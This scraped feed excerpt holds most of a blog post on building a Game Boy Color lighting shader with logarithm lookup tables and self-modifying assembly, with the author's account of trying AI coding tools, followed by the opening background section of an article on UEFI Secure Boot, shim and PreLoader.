b &amp;= \cos N_\theta \cos L_\theta \\
v &amp;= m \cos(N_\varphi - L_\varphi) + b
\end{aligned}</annotation></semantics></math></span></span></span></p>
<p>The ROM encodes each pixel as a 3-byte tuple of <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>N</mi><mi>φ</mi></msub><mo separator="true">,</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(N_\varphi, \log(m), b)</annotation></semantics></math></span></span></span>.</p>
<p>Why <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\log(m)</annotation></semantics></math></span></span></span>? Well...</p>
<h3 id="the-game-boy-has-no-multiply-instruction">The Game Boy has no multiply instruction</h3>
<p>Not only does the SM83 CPU <em>not</em> support multiplication, but it also doesn't support floats. That's a real bummer.</p>
<p>We have to get really creative when the entire mathematical foundation of this project involves multiplying non-integer numbers.</p>
<p>What do we do instead? We use logarithms and lookup tables!</p>
<p>Logarithms have this nice property of being able to factor products to outside the <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>⁡</mo></mrow><annotation encoding="application/x-tex">\log</annotation></semantics></math></span></span></span>. This way, we can add values instead!</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mi>b</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo>⋅</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mi>b</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mi>b</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>x</mi><mo>⋅</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>b</mi><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></msup></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
\log_b(x \cdot y) &amp;= \log_b(x) + \log_b(y) \\
x \cdot y &amp;= b^{\log(x) + \log(y)}
\end{aligned}</annotation></semantics></math></span></span></span></p>
<p>This requires two lookups: a <code>log</code> lookup, and a <code>pow</code> lookup.</p>
<p>In pseudocode, multiplying 0.3 and 0.5 looks like this:</p>
<pre><code><span>pow</span> = [ ... ]              <span># A 256-entry lookup table</span>

<span># float_to_logspace() is compile-time. Accepts -1.0 to +1.0.</span>
<span># x and y are 8-bit values in log-space</span>
x = float_to_logspace(<span>0.3</span>) 
y = float_to_logspace(<span>0.5</span>)

result = <span>pow</span>[x + y]
</code></pre>
<p>One limitation of this is that it's not possible to take the log of a negative number. e.g. <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\log(-1)</annotation></semantics></math></span></span></span> has no real solution.</p>
<p>We can overcome this by encoding a "sign" bit in the MSB of the log-space value. When adding two log-space values together, the sign bit is effectively XOR'd (toggled). We just need to ensure the remaining bits don't overflow into it. We ensure this by keeping the remaining bits small enough.</p>
<p>The <code>pow</code> lookup accounts for this bit and returns a positive or negative result based on it.</p>
<h3 id="all-scalars-and-lookups-are-8-bit-fractions">All scalars and lookups are 8-bit fractions</h3>
<p>It's advantageous to restrict numbers to a single byte, for both run-time performance and ROM size. 8-bit fractions are pretty extreme by today's standards, but believe it or not, it works. It's lossy as hell, but it works!</p>
<p>All scalars we're working with are between -1.0 and +1.0.</p>
<div>





































































<table><thead><tr><th>Byte</th><th>Resolved linear-space value</th><th>Resolved log-space value</th></tr></thead><tbody><tr><td>0</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>0</mn><mn>127</mn></mfrac><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{0 \over 127} = 0</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>0</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{0} = 1</annotation></semantics></math></span></span></span></td></tr><tr><td>1</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>127</mn></mfrac><mo>≈</mo><mn>0.0079</mn></mrow><annotation encoding="application/x-tex">{1 \over 127} \approx 0.0079</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>1</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mn>0.89</mn></mrow><annotation encoding="application/x-tex">2^{- {1 \over 6}} \approx 0.89</annotation></semantics></math></span></span></span></td></tr><tr><td>2</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>127</mn></mfrac><mo>≈</mo><mn>0.0158</mn></mrow><annotation encoding="application/x-tex">{2 \over 127} \approx 0.0158</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>2</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mn>0.79</mn></mrow><annotation encoding="application/x-tex">2^{- {2 \over 6}} \approx 0.79</annotation></semantics></math></span></span></span></td></tr><tr><td>...</td><td></td><td></td></tr><tr><td>126</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>126</mn><mn>127</mn></mfrac><mo>≈</mo><mn>0.9921</mn></mrow><annotation encoding="application/x-tex">{126 \over 127} \approx 0.9921</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>126</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{2^{-{126 \over 6}}} \approx 0</annotation></semantics></math></span></span></span></td></tr><tr><td>127</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>127</mn><mn>127</mn></mfrac><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">{127 \over 127} = 1</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>127</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{2^{-{127 \over 6}}} \approx 0</annotation></semantics></math></span></span></span></td></tr><tr><td>128</td><td>undefined</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>0</mn></msup><mo>=</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-2^{0} = -1</annotation></semantics></math></span></span></span></td></tr><tr><td>129</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mfrac><mn>127</mn><mn>127</mn></mfrac><mo>=</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-{127 \over 127} = -1</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>1</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mo>−</mo><mn>0.89</mn></mrow><annotation encoding="application/x-tex">-2^{- {1 \over 6}} \approx -0.89</annotation></semantics></math></span></span></span></td></tr><tr><td>130</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mfrac><mn>126</mn><mn>127</mn></mfrac><mo>≈</mo><mo>−</mo><mn>0.9921</mn></mrow><annotation encoding="application/x-tex">-{126 \over 127} \approx -0.9921</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>2</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mo>−</mo><mn>0.79</mn></mrow><annotation encoding="application/x-tex">-2^{- {2 \over 6}} \approx -0.79</annotation></semantics></math></span></span></span></td></tr><tr><td>...</td><td></td><td></td></tr><tr><td>254</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mfrac><mn>2</mn><mn>127</mn></mfrac><mo>≈</mo><mo>−</mo><mn>0.0158</mn></mrow><annotation encoding="application/x-tex">-{2 \over 127} \approx -0.0158</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>126</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">-{2^{-{126 \over 6}}} \approx -0</annotation></semantics></math></span></span></span></td></tr><tr><td>255</td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mfrac><mn>1</mn><mn>127</mn></mfrac><mo>≈</mo><mo>−</mo><mn>0.0079</mn></mrow><annotation encoding="application/x-tex">-{1 \over 127} \approx -0.0079</annotation></semantics></math></span></span></span></td><td><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>127</mn><mn>6</mn></mfrac></mrow></msup><mo>≈</mo><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">-{2^{-{127 \over 6}}} \approx -0</annotation></semantics></math></span></span></span></td></tr></tbody></table></div>
<p>Addition and multiplication both use... addition!</p>
<p>Consider adding the two bytes: 5 + 10 = 15</p>
<ul>
<li><strong>Addition uses linear-space values</strong>: <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>5</mn><mn>127</mn></mfrac><mo>+</mo><mfrac><mn>10</mn><mn>127</mn></mfrac><mo>=</mo><mfrac><mn>15</mn><mn>127</mn></mfrac></mrow><annotation encoding="application/x-tex">{5 \over 127} + {10 \over 127} = {15 \over 127}</annotation></semantics></math></span></span></span></li>
<li><strong>Multiplication uses log-space values:</strong>  <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>5</mn><mn>6</mn></mfrac></mrow></msup><mo>⋅</mo><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>10</mn><mn>6</mn></mfrac></mrow></msup><mo>=</mo><msup><mn>2</mn><mrow><mo>−</mo><mfrac><mn>15</mn><mn>6</mn></mfrac></mrow></msup></mrow><annotation encoding="application/x-tex">2^{-{5 \over 6}} \cdot 2^{-{10 \over 6}} = 2^{-{15 \over 6}}</annotation></semantics></math></span></span></span></li>
</ul>
<p>Why is the denominator 127 instead of 128? It's because I needed to represent both positive and negative 1. In a two's-complement encoding, signed positive 128 doesn't exist.</p>
<p>You might notice that the log-space values cycle and become negative at byte 128. The log-space values use bit 7 of the byte to encode the "sign" bit. As mentioned in the previous section, this is important for toggling the sign during multiplication.</p>
<p>The log-space values also use <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mfrac><mn>1</mn><mn>6</mn></mfrac></msup></mrow><annotation encoding="application/x-tex">2^{1 \over 6}</annotation></semantics></math></span></span></span> as a base, because I chose this as a sufficiently small base to meet the requirement that adding 3 of these log-space values won't overflow (42+42+42 = 126). Bytes 43 thru 127 are near 0, so in practice the ROM doesn't encode these values.</p>
<p>The lookup tables look like this:</p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/lookup_tables.png" alt="" loading="lazy" width="800" height="285"></p>
<p>Where:</p>
<ul>
<li><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>encode</mtext><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{encode}(y)</annotation></semantics></math></span></span></span> takes a real number and returns an unsigned byte.</li>
<li><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>decode</mtext><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{decode}(x)</annotation></semantics></math></span></span></span> takes an unsigned byte and returns a return number.
And:</li>
<li><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>encode</mtext><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>round</mtext><mo stretchy="false">(</mo><mn>127</mn><mi>y</mi><mo stretchy="false">)</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>256</mn></mrow><annotation encoding="application/x-tex">\text{encode}(y) = \text{round}(127y) \bmod 256</annotation></semantics></math></span></span></span></li>
<li><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>decode</mtext><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mtext>signedbyte</mtext><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><mn>127</mn></mfrac></mrow><annotation encoding="application/x-tex">\text{decode}(x) = {\text{signedbyte}(x) \over 127}</annotation></semantics></math></span></span></span></li>
</ul>
<p>Reconstructed functions look like this. The precision error is shown in the jagged "staircase" patterns:</p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/lookups_reconstructed.png" alt="" loading="lazy" width="800" height="305"></p>
<p>It may look like there's a lot of error, but it's fast and it's passable enough to look alright! ;)</p>
<h3 id="whats-with-cos_log">What's with cos_log?</h3>
<p>It's basically a combined <span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>cos</mi><mo>⁡</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\log(\cos x)</annotation></semantics></math></span></span></span>. This exists because in practice, cosine is always used with a multiplication.</p>
<p>The core calculation for the shader is:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><mi>m</mi><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>N</mi><mi>φ</mi></msub><mo>−</mo><msub><mi>L</mi><mi>φ</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">v = m \cos(N_\varphi - L_\varphi) + b</annotation></semantics></math></span></span></span></p>
<p>And we can rewrite it as:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>v</mi><mo>=</mo><mtext>pow</mtext><mo stretchy="false">(</mo><msub><mi>m</mi><mrow><mi>l</mi><mi>o</mi><mi>g</mi></mrow></msub><mo>+</mo><msub><mrow><mi>cos</mi><mo>⁡</mo></mrow><mrow><mi>l</mi><mi>o</mi><mi>g</mi></mrow></msub><mo stretchy="false">(</mo><msub><mi>N</mi><mi>φ</mi></msub><mo>−</mo><msub><mi>L</mi><mi>φ</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">v = \text{pow}(m_{log} + \cos_{log}(N_\varphi - L_\varphi)) + b</annotation></semantics></math></span></span></span></p>
<p>This amounts to, per-pixel:</p>
<ul>
<li>1 subtraction</li>
<li>1 lookup to <code>cos_log</code></li>
<li>1 addition</li>
<li>1 lookup to <code>pow</code></li>
<li>1 addition</li>
</ul>
<p>For a total of, per-pixel:</p>
<ul>
<li>3 additions/subtractions</li>
<li>2 lookups</li>
</ul>
<h3 id="how-fast-is-it">How fast is it?</h3>
<p><strong>The procedure processes 15 tiles per frame</strong>. It can process more if some of the tile's rows are empty (all 0), but it's guaranteed to process at least 15.</p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/debugger_critical_loop_events.png" alt="" loading="lazy" width="800" height="630"></p>
<p><em>Figure: Mesen's "Event Viewer" window, showing a dot for each iteration (tile row) of the shader's critical loop.</em></p>
<p>There's some intentional visual tearing as well. The image itself is more than 15 tiles, so the ROM actually switches to rendering different portions of the image for each frame. The tearing is less noticeable because of ghosting on the LCD display, so I thought it was acceptable.</p>
<p><strong>A pixel takes about 130 cycles, and an empty row's pixel takes about 3 cycles.</strong></p>
<p>At one point I had calculated 15 tiles rendering at exactly 123,972 cycles, including the call and branch overhead. This is an overestimate now, because I since added an optimization for empty rows.</p>
<p>The Game Boy Color's CPU runs up to 8.388608 MHz, or roughly 139,810 T-cycles per frame (1/60 of a second).</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>123972</mn><mn>139810</mn></mfrac><mo>≈</mo><mn>89</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">{123972 \over 139810} \approx 89 \%</annotation></semantics></math></span></span></span>
About 89% of a frame's available CPU time goes to rendering the 15 tiles per frame. The remaining time goes to other functionality like responding to user input and performing hardware IO.</p>
<h3 id="self-modifying-code">Self-modifying code</h3>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/hex_patched.gif" alt="" loading="lazy"></p>
<p><em>Figure: A hex representation of the shader subroutine instructions in RAM. The blue digits show a patch to change <code>sub a, 0</code> into <code>sub a, 8</code>.</em></p>
<p>The core shader subroutine contains a hot path that processes about 960 pixels per frame. It's really important to make this as fast as possible!</p>
<p>Self-modifying code is a super-effective way to make code <em>fast</em>. But most modern developers don't do this anymore, and there are good reasons: It's difficult, rarely portable, and it's hard to do it right without introducing serious security vulnerabilities. Modern developers are spoiled by an abundance of processing power, super-scalar processors that take optimal paths, and modern JIT (Just-In-Time) runtimes that generate code on the fly. But we're on the Game Boy, baybeee, so we don't have those options.</p>
<p>If you're a developer who uses higher-level languages like Python and JavaScript, the closest equivalent to self-modifying code is <code>eval()</code>. Think about how nervous <code>eval()</code> makes you feel. That's almost exactly how native developers feel about modifying instructions.</p>
<p>On the Game Boy's <strong>SM83</strong> processor, it's faster to add and subtract by a hard-coded number than it is to load that number from memory.</p>
<p>i.e. <code>x += 5</code> is faster than <code>x += variable</code>.</p>
<pre><code><span>unsigned</span> <span>char</span> Ltheta = <span>8</span>;

<span>// Slower</span>
v = (*in++) - Ltheta;

<span>// Faster</span>
v = (*in++) - <span>8</span>;
</code></pre>
<p>In SM83 assembly, this looks like:</p>
<pre><code>; Slower: 28 cycles
ld a, [Ltheta]   ; 12 cycles: Read variable "Ltheta" from HRAM
ld b, a          ; 4 cycles:  Move value to B register
ld a, [hl+]      ; 8 cycles:  Read from the HL pointer
sub a, b         ; 4 cycles:  A = A - B

; Faster: 16 cycles
ld a, [hl+]      ; 8 cycles: Read from the HL pointer
sub a, 8         ; 8 cycles: A = A - 8
</code></pre>
<p>The faster way shaves off 12 cycles. If we're rendering 960 pixels, this saves a total of 11,520 cycles. This doesn't sound like a lot, but it's roughly 10% of the shader's runtime!</p>
<p>So how can we get the faster subtraction if the value we're subtracting with changes?</p>
<p>By modifying the instruction operand!</p>
<pre><code>2A      ld a, [hl+]
D6 08   sub a, 8
</code></pre>
<h2 id="an-overall-failed-attempt-at-using-ai">An overall failed attempt at using AI</h2>
<blockquote>
<p>"AI Will Be Writing 90% of Code in 3 to 6 Months"
<br>
— Dario Amodei, CEO of Anthropic (March 2025 - 9 months ago as of writing)</p>
</blockquote>
<p><strong>95% of this project was made by hand</strong>. Large language models struggle to write Game Boy assembly. I don't blame them.</p>

<p><em>Update: 2026-02-03:</em>  I attempted to use AI to try out the process, mostly because 1) the industry won't shut up about AI, and 2) I wanted a grounded opinion of it for novel projects, so I have a concrete and personal reference point when talking about it in the wild. At the end of the day, this is still a hobbyist project, so AI really isn't the point! But still...</p>
<p>I believe in disclosing all attempts or actual uses of generative AI output, because I think it's unethical to deceive people about the process of your work. Not doing so undermines trust, and amounts to disinformation or plagiarism. Disclosure also invites people who have disagreements to engage with the work, which they should be able to. I'm open to feedback, btw.</p>
<p><strong>I'll probably write something about my experiences with AI in the future.</strong></p>
<p><strong>As far as disclosures go, I used AI for</strong>:</p>
<ol>
<li>Python: Reading OpenEXR layers, as part of a conversion script to read normal map data</li>
<li>Python/Blender: Some Python scripts for populating Blender scenes, to demo the process in Blender</li>
<li>SM83 assembly: Snippets for Game Boy Color features like double-speed and VRAM DMA. Unsurprising, because these are likely available somewhere else.</li>
</ol>
<p>I <em>attempted</em> - and failed - to use AI for:</p>
<ol>
<li>SM83 assembly: <em>(Unused)</em> Generating an initial revision of the shader code</li>
</ol>
<p>I'll also choose to disclose what <strong>I did NOT use AI for:</strong></p>
<ol>
<li>Writing this article</li>
<li>The algorithms, lookups, all other SM83 assembly</li>
<li>3D assets</li>
<li>The soul 🌟 (AI techbros are groaning right now)</li>
</ol>
<h3 id="i-tried-to-make-ai-write-game-boy-assembly">I tried to make AI write Game Boy assembly</h3>
<p>Just to see what it would do, <strong>I fed pseudocode into Claude Sonnet 4</strong> (the industry claims that it's the best AI model for coding in 2025), and got it to generate SM83 assembly:</p>
<p><a href="https://claude.ai/share/846cb7d4-e4a6-40ab-8aaa-6e4c308e3da3" target="_blank" rel="noopener noreferrer nofollow">https://claude.ai/share/846cb7d4-e4a6-40ab-8aaa-6e4c308e3da3</a></p>
<p>It was an interesting process. To start, I chewed Claude's food and gave it pseudocode, because I had a data format in mind, and I assumed it'd struggle with a higher-level description.</p>
<p>I was skeptical that it wouldn't do well, but it did better than I thought it would. It even produced code that worked when I persisted it and guided it enough. However, it wasn't very fast, and it made some initial mistakes by assuming the SM83 processor was the Z80 processor. I attempted to get Claude to optimize it by offering suggestions. It did well initially, but it introduced errors until I reached the conversation limit.</p>
<p>After that point, I manually rewrote everything. My final implementation is aggressively optimized and barely has any resemblance to Claude's take.</p>
<p><strong>And it <em>loved</em> telling me how "absolutely right" I always was.</strong> 🥺</p>
<p><img src="https://blog.otterstack.com/posts/202512-gbshader/claude_glazing_me.png" alt="" loading="lazy" width="539" height="800"></p>
<p>It was better for small tasks and snippets of code. The tile demo in my video was partially AI scripted. A Game Boy subroutine for copying to VRAM was authored by AI. Few issues there.</p>
<p><del>An early iteration of the normal map conversion script accepted OpenEXR files. I didn't feel like drudging through a new library, so I asked ChatGPT to convert an OpenEXR file to a numpy array. It did pretty well! It however also introduced a very subtle bug that I didn't catch for weeks. Once I finally read the code, I realized it was sorting channel names alphabetically (so XYZ sorts as XYZ, but RGB sorts as BGR). It's the sort of error I'd never make myself.</del></p>
<p>Update: 2026-02-03 - Yeah, so the OpenEXR code could've been done in two lines this whole time. One of the first examples in <a href="https://pypi.org/project/OpenEXR/" target="_blank" rel="noopener noreferrer nofollow">the official PyPi readme</a> shows how to get a numpy array from an OpenEXR file - exactly what I needed. I could update this snippet for different channels too in theory, but basically it's this. ChatGPT gave me 30 lines to handle edge cases that simply won't happen.</p>
<pre><code><span>with</span> OpenEXR.File(<span>"readme.exr"</span>) <span>as</span> infile:
    RGB = infile.channels()[<span>"RGB"</span>].pixels
</code></pre>
<p>At this point, I can't emphasize <strong>verifiable</strong> enough.</p>
<p>This, and other experiences, made me realize how easy it is to let your guard down when using AI like this, even if you're an experienced coder. AI can be helpful, but discretion is very much a required skill. <a href="https://en.wikipedia.org/wiki/Slopsquatting" target="_blank" rel="noopener noreferrer nofollow">I'm just thankful I never relied on it for installing hallucinated packages</a>.</p>

<p>If you like this, share this post or like and comment on the YouTube video!</p>
<p><a href="https://www.youtube.com/watch?v=SAQXEW3ePwo" target="_blank" rel="noopener noreferrer nofollow">https://www.youtube.com/watch?v=SAQXEW3ePwo</a></p>
<p>(post will be updated once I post on Bluesky)</p></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Exploiting signed bootloaders to circumvent UEFI Secure Boot (103 pts)]]></title>
            <link>https://habr.com/en/articles/446238/</link>
            <guid>46934579</guid>
            <pubDate>Sun, 08 Feb 2026 14:40:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://habr.com/en/articles/446238/">https://habr.com/en/articles/446238/</a>, See on <a href="https://news.ycombinator.com/item?id=46934579">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-test-id="articleStats" data-v-085cd854=""><!----><p><span><svg height="24" width="24"><title>Reading time</title><use xlink:href="/img/megazord-v28.cba4c116..svg#clock"></use></svg></span><span>6 min</span></p><p><span data-v-085cd854=""><svg height="24" width="24"><title>Reach and readers</title><use xlink:href="/img/megazord-v28.cba4c116..svg#counter-views"></use></svg><span title="53735">54K</span></span></p></div><div xmlns="http://www.w3.org/1999/xhtml" id="post-content-body" data-v-aad06d04="" data-gallery-root="" lang="en"><p><a href="https://habr.com/ru/post/446072/">Русская версия этой статьи.</a><br>
Modern PC motherboards' firmware follow <abbr title="Unified Extensible Firmware Interface, BIOS replacement">UEFI</abbr> specification since 2010. In 2013, a new technology called Secure Boot appeared, intended to prevent <abbr title="Malicious bootloaders designed to modify real OS bootloader, infect system files on HDD, or both">bootkits</abbr> from being installed and run. Secure Boot prevents the execution of unsigned or untrusted program code (.efi programs and operating system boot loaders, additional hardware firmware like video card and network adapter OPROMs).<br>
Secure Boot can be disabled on any retail motherboard, but a mandatory requirement for changing its state is physical presence of the user at the computer. It is necessary to enter UEFI settings when the computer boots, and only then it's possible to change Secure Boot settings.</p><p>

Most motherboards include only Microsoft keys as trusted, which forces bootable software vendors to ask Microsoft to sign their bootloaders. This process include code audit procedure and justification for the need to sign their file with globally trusted key if they want the disk or USB flash to work in Secure Boot mode without adding their key on each computer manually.<br>
Linux distributions, hypervisors, antivirus boot disks, computer recovery software authors all have to sign their bootloaders in Microsoft.</p><p>

I wanted to make a bootable USB flash drive with various computer recovery software that would boot without disabling Secure Boot. Let's see how this can be achieved. <a name="habracut"></a></p><h2>Signed bootloaders of bootloaders</h2><p>So, to boot Linux with Secure Boot enabled, you need a signed bootloader. Microsoft forbid to sign software licensed under GPLv3 because of <abbr title="The creation of a system that incorporates software under the terms of a copyleft software license (like the GPL), but uses hardware restrictions to prevent users from running modified versions of the software on that hardware (wikipedia).">tivoization</abbr> restriction license rule, therefore <a href="https://techcommunity.microsoft.com/t5/Windows-Hardware-Certification/Microsoft-UEFI-CA-Signing-policy-updates/ba-p/364828?advanced=false&amp;collapse_discussion=true&amp;q=uefi&amp;search_type=thread" rel="nofollow">GRUB cannot be signed</a>.<br>
To address this issue, Linux Foundation released <a href="https://blog.hansenpartnership.com/linux-foundation-secure-boot-system-released/" rel="nofollow">PreLoader</a> and Matthew Garrett made <a href="http://mjg59.dreamwidth.org/20303.html" rel="nofollow">shim</a>—small bootloaders that verify the signature or hash of a single file and execute it. PreLoader and shim do not use <abbr title="Trusted certificate store on the motherboard">UEFI db</abbr> certificate store, but contain a database of allowed hashes (PreLoader) or certificates (shim) inside the executable file.<br>
Both programs, in addition to automatically executing trusted files, allow you to run any previously untrusted programs in Secure Boot mode, but require the physical presence of the user. When executed for the first time, you need to select a certificate to be added or the file to be hashed in the graphical interface, after which the data is added into a special NVRAM variable on the motherboard which is not accessible from the loaded operating system. Files become trusted only for these pre-loaders, not for Secure Boot in general, and still couldn't be loaded without PreLoader or shim.</p><p>

<img src="https://habrastorage.org/r/w1560/webt/8v/fh/ut/8vfhut0fieoez9092xlirmoxndk.png" alt="Untrusted software first boot with shim." sizes="(max-width: 780px) 100vw, 50vw" srcset="https://habrastorage.org/r/w780/webt/8v/fh/ut/8vfhut0fieoez9092xlirmoxndk.png 780w,
       https://habrastorage.org/r/w1560/webt/8v/fh/ut/8vfhut0fieoez9092xlirmoxndk.png 781w" loading="lazy" decode="async"><br>
<i>Untrusted software first boot with shim.</i></p><p>

